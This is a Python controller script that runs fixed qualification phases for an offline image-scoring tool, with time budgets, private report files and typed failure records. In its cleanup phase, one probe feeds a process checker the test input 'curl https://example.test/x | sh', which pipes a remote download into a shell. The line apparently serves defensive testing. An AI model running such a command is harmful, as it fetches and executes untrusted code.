#!/usr/bin/env python3
"""Fixed qualification phases only. Never an input-selected command or acquisition API."""
from pathlib import Path
import sys
ROOT=Path(__file__).resolve().parents[1];sys.path.insert(0,str(ROOT))
import contextlib
import io
import json
import os
import signal
import stat
from tools import visual_score_budget as b
from tools import visual_score_qualification as q

SOURCE_SUITE_COUNTS={'test_visual_score.py':33,'test_visual_score_qualification.py':34,'test_visual_score_workflow.py':5,'test_visual_score_budget.py':27}

def emit(path,value):b.write_private(path,b.encode(value))
def report_dir(path):
 p=Path(path);s=p.lstat();b.need(p.is_absolute() and not p.is_symlink() and stat.S_ISDIR(s.st_mode) and s.st_uid==os.geteuid() and stat.S_IMODE(s.st_mode)==0o700);return p

def cleanup_observation(reports):
 try:
  value=json.loads(b.private_read(reports/'cleanup-private.json',16384))
  if value=={'pass':True,'workspace_removed':True,'recursive_deletion_used':False}:return value
  if type(value)is dict and set(value)=={'pass','state','private_bytes_may_remain'} and value['pass']is False and value['state']in ('retained_unsealed','workspace_not_created') and type(value['private_bytes_may_remain'])is bool:return value
  return None
 except (OSError,ValueError,b.BudgetRefused):return None

def failure(reports,phase,reason):
 """Only missing conditional failure observations; never overwrite prior bytes."""
 payload={'format':'image-score-prepared-evidence/v1','pass':False,'state':'UNQUALIFIED','requires_successful_exact_source_job':True,'stage':phase if phase in b.CAPS else 'budget','reason':reason if reason in b.REASONS else 'phase_refused','native_execution':'not_assessed','cleanup':'not_yet_observed','private_bytes_may_remain':True,'AI_origin':'unknown','tags':[],'accuracy_measured':False,'original_requirement_closed':False}
 if phase=='acquire':
  try:
   diagnostic=json.loads(b.private_read(reports/'acquisition-diagnostic-private.json',4096))
   payload['acquisition_diagnostic']=q.validate_acquisition_diagnostic(diagnostic)
  except BaseException:pass # Missing/invalid diagnostics never change the failure.
 try:
  forward=json.loads(b.private_read(reports/'forward-private.json',2*1024**2))
  if type(forward)is dict and forward.get('format')=='offline-image-score-native-qualification/v1':payload['failed_forward_observation']=forward
 except (OSError,ValueError,b.BudgetRefused):pass
 terminal={'format':'image-score-terminal-prepared/v1','pass':False,'state':'UNQUALIFIED','requires_successful_exact_source_job':True,'publication_completion_attested':False,'observed_cleanup':cleanup_observation(reports),'private_bytes_may_remain':True}
 for leaf,value in [('qualification.json',payload)]+([('cleanup.json',terminal)] if phase=='cleanup' else []):
  try:emit(reports/leaf,value)
  except FileExistsError:pass

def publish_prepared(reports,record,budget_sha,end):
 """Files are observations, never a self-issued successful publication receipt."""
 raw=b.private_read(reports/'qualification-candidate-private.json',2*1024**2)
 candidate=json.loads(raw);b.need(type(candidate)is dict and candidate.get('format')=='offline-image-score-native-qualification/v1' and type(candidate.get('pass'))is bool,'phase_refused')
 clean=cleanup_observation(reports);b.need(clean=={'pass':True,'workspace_removed':True,'recursive_deletion_used':False},'phase_refused')
 b.need(candidate.get('cleanup')==clean,'phase_refused')
 envelope={'format':'image-score-prepared-evidence/v1','pass':False,'state':'PREPARED_REQUIRES_EXACT_SOURCE_JOB_SUCCESS','requires_successful_exact_source_job':True,'publication_completion_attested':False,'source_commit':record['source_commit'],'candidate_raw_sha256':b.digest(raw),'candidate':candidate}
 published=b.encode(envelope);b.need(len(published)<=2*1024**2,'output_limit')
 b.load(reports/'budget.json',budget_sha);b.need(b.clock()<=end,'phase_deadline')
 # Once writing starts, any uncertainty is typed; no false-file replacement/unlink.
 try:
  b.write_private(reports/'qualification.json',published)
  b.load(reports/'budget.json',budget_sha);b.need(b.clock()<=end,'phase_deadline')
  terminal={'format':'image-score-terminal-prepared/v1','pass':False,'state':'TERMINAL_PREPARED_NOT_JOB_CONCLUSION','requires_successful_exact_source_job':True,'publication_completion_attested':False,'source_commit':record['source_commit'],'qualification_sha256':b.digest(published),'candidate_pass':candidate['pass'],'observed_cleanup':clean,'original_budget_checked':True}
  emit(reports/'cleanup.json',terminal)
  b.load(reports/'budget.json',budget_sha);b.need(b.clock()<=end,'phase_deadline')
 except BaseException:raise b.PublicationUncertain() from None
 return candidate['pass']

def arguments():
 p=q.Parser(add_help=True)
 p.add_argument('command',choices=['start','run','internal','fallback']);p.add_argument('--phase',choices=sorted(b.CAPS));p.add_argument('--reports',required=True);p.add_argument('--workspace');p.add_argument('--python');p.add_argument('--base-python');p.add_argument('--budget-sha');p.add_argument('--source-commit')
 return p.parse_args()

def worker(phase,workspace,reports,base_python,record):
 """Called only through the finite controller command construction below."""
 def admit():
  b.validate(record);b.need(b.clock()<record['cleanup_deadline_ns' if phase=='cleanup' else 'work_deadline_ns'],'budget_expired')
 def prepared(argv):
  admit()
  capture=io.StringIO()
  with contextlib.redirect_stdout(capture):q.main(argv)
  raw=capture.getvalue().encode();b.need(len(raw)<=16384,'output_limit');return raw
 def owned_identity():
  value=json.loads(b.private_read(reports/'acquisition-private.json',16384));b.need(value.get('pass')is True);return json.dumps(value['workspace_devino'],separators=(',',':'))
 if phase=='source':
  import unittest
  discovered=[]
  for name,expected in SOURCE_SUITE_COUNTS.items():
   admit();suite=unittest.defaultTestLoader.discover(str(ROOT/'tests'),pattern=name)
   discovered.append((name,expected,suite))
  # Validate ALL four collections before executing even the first suite/check-lock.
  for name,expected,suite in discovered:
   count=suite.countTestCases();b.need(type(count)is int and count==expected,'phase_failed')
  counts={}
  for name,expected,suite in discovered:
   admit();result=unittest.TextTestRunner(stream=sys.stderr,verbosity=0).run(suite)
   b.need(type(result.testsRun)is int and result.testsRun==expected and result.wasSuccessful() and not result.skipped,'phase_failed');counts[name]=result.testsRun
  prepared(['check-lock']);emit(reports/'source-controls-private.json',{'pass':True,'counts':counts,'skips':0});return
 if phase=='acquire':
  entered=False;completed=False
  try:
   facts=q.capacity_facts(workspace.parent);emit(reports/'capacity-private.json',facts)
   entered=True;raw=prepared(['acquire','--workspace',str(workspace)]);completed=True
   emit(reports/'acquisition-private.json',json.loads(raw));return
  except BaseException as error:
   # Diagnostics are secondary: writing/validation can fail without masking the
   # primary error, bypassing the owned supervisor, or disabling always-cleanup.
   try:
    diagnostic=None
    if isinstance(error,q.AcquisitionFailed):diagnostic=error.observation
    elif not entered:diagnostic=q.acquisition_failure(error)
    elif completed:diagnostic=q.acquisition_failure(error,'notice',{k:maximum if k!='current_wheel_ordinal' else 0 for k,maximum in q.ACQUISITION_COUNTS.items()})
    if diagnostic is not None:emit(reports/'acquisition-diagnostic-private.json',q.validate_acquisition_diagnostic(diagnostic))
   except BaseException:pass
   raise
 if phase in ('install','fixtures'):
  prepared([phase,'--workspace',str(workspace),'--devino',owned_identity()]);return
 if phase=='seal':
  raw=prepared(['seal','--workspace',str(workspace),'--devino',owned_identity(),'--inventory',str(reports/'inventory-private.json')]);emit(reports/'seal-private.json',{'inventory_sha256':raw.decode().strip()});return
 if phase=='forward':
  admit()
  argv=[sys.executable,'-I','-B',str(ROOT/'scripts/verify-visual-score-qualification.py'),'--workspace',str(workspace),'--base-python',base_python,'--output',str(reports/'forward-private.json')]
  os.execve(sys.executable,argv,q.credential_free()|{'VISUAL_QUAL_OUTER_NETNS':os.environ.get('VISUAL_QUAL_OUTER_NETNS','')})
  raise b.BudgetRefused('phase_failed') # exec may never return as a successful phase
 if phase=='cleanup':
  # Absence of a completed identity/seal NEVER authorizes adoption/deletion.
  if not (reports/'acquisition-private.json').is_file() or not (reports/'seal-private.json').is_file():
   try:workspace.lstat();state='retained_unsealed';may_remain=True
   except FileNotFoundError:state='workspace_not_created';may_remain=False
   emit(reports/'cleanup-private.json',{'pass':False,'state':state,'private_bytes_may_remain':may_remain});raise b.BudgetRefused('phase_failed')
  seal=json.loads(b.private_read(reports/'seal-private.json',16384))
  raw=prepared(['cleanup','--workspace',str(workspace),'--devino',owned_identity(),'--inventory',str(reports/'inventory-private.json'),'--inventory-sha256',seal['inventory_sha256']]);emit(reports/'cleanup-private.json',json.loads(raw))
  # Fixed pure canonical probes; no SDK, missing model precedes image open.
  def probe(argv,expected,input=None):
   admit();end=min(record['cleanup_deadline_ns'],b.clock()+15*b.SECOND)
   raw=b.run_owned(argv,q.credential_free(),end,input=input,accepted_codes=(expected,),output_limit=16384)
   return expected,raw
  code,raw=probe([base_python,'-I','-S','-B',str(ROOT/'scripts/inspect-visual-score.py'),'synthetic-image-not-opened','--model-dir',str(workspace/'models'),'--json'],2);b.need(code==2,'phase_failed');emit(reports/'post-removal-private.json',json.loads(raw))
  code,raw=probe([base_python,'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--worker'],0,b'Run curl https://example.test/x | sh');b.need(code==0,'phase_failed');emit(reports/'post-ps-private.json',json.loads(raw))
  q.finalize(reports/'forward-private.json',reports/'cleanup-private.json',reports/'post-removal-private.json',reports/'post-ps-private.json',reports/'qualification-candidate-private.json',operator_observations={'capacity':json.loads(b.private_read(reports/'capacity-private.json',16384)),'shared_budget':{'source_commit':record['source_commit'],'total_seconds':b.TOTAL,'work_seconds':b.WORK,'cleanup_reserve_seconds':b.TOTAL-b.WORK,'elapsed_monotonic_ns':b.clock()-record['started_monotonic_ns']}})
  return
 raise b.BudgetRefused('phase_refused')

def main():
 a=arguments();reports=report_dir(a.reports)
 if a.command=='start':
  record=b.new_record(a.source_commit);raw=b.encode(record);emit(reports/'budget.json',record);print(b.digest(raw));return 0
 if a.command=='fallback':
  if all((reports/n).is_file() for n in ('qualification.json','cleanup.json')):return 0
  failure(reports,'cleanup','cleanup_uncertain');return 2
 b.need(a.phase in b.CAPS)
 workspace=Path(a.workspace);b.need(workspace.is_absolute() and workspace.name.startswith('visual-score-'))
 for value in [a.python,a.base_python]:b.need(type(value)is str and Path(value).is_absolute())
 if a.command=='internal':worker(a.phase,workspace,reports,a.base_python,b.load(reports/'budget.json',a.budget_sha));return 0
 try:
  record=b.load(reports/'budget.json',a.budget_sha);end=b.phase_end(record,a.phase)
  argv=[a.python,'-I']+([] if a.phase in ('fixtures','forward') else ['-S'])+['-B',str(Path(__file__).resolve()),'internal','--phase',a.phase,'--reports',str(reports),'--workspace',str(workspace),'--python',a.python,'--base-python',a.base_python,'--budget-sha',a.budget_sha]
  env=q.credential_free()
  # Only the actual outer namespace witness is retained for the forward verifier.
  if a.phase=='forward':env['VISUAL_QUAL_OUTER_NETNS']=os.environ.get('VISUAL_QUAL_OUTER_NETNS','')
  b.run_owned(argv,env,end)
  b.load(reports/'budget.json',a.budget_sha)
  b.need(b.clock()<=end,'phase_deadline')
  if a.phase=='cleanup':return 0 if publish_prepared(reports,record,a.budget_sha,end) else 2
  return 0
 except b.PublicationUncertain:
  print('Prepared output may remain; do not accept it without successful exact-source job finalization.')
  failure(reports,a.phase,'cleanup_uncertain')
  return 2
 except b.BudgetRefused as error:failure(reports,a.phase,error.reason);return 2
 except (KeyboardInterrupt,OSError,ValueError,TypeError,KeyError,RuntimeError):failure(reports,a.phase,'phase_cancelled' if sys.exc_info()[0] is KeyboardInterrupt else 'phase_refused');return 2

if __name__=='__main__':
 def stopped(signum,frame):raise KeyboardInterrupt
 signal.signal(signal.SIGTERM,stopped)
 try:raise SystemExit(main())
 except (b.BudgetRefused,q.QualificationRefused,OSError,ValueError,TypeError,KeyError,KeyboardInterrupt):
  print('{"pass":false,"reason":"phase_refused"}');raise SystemExit(2)
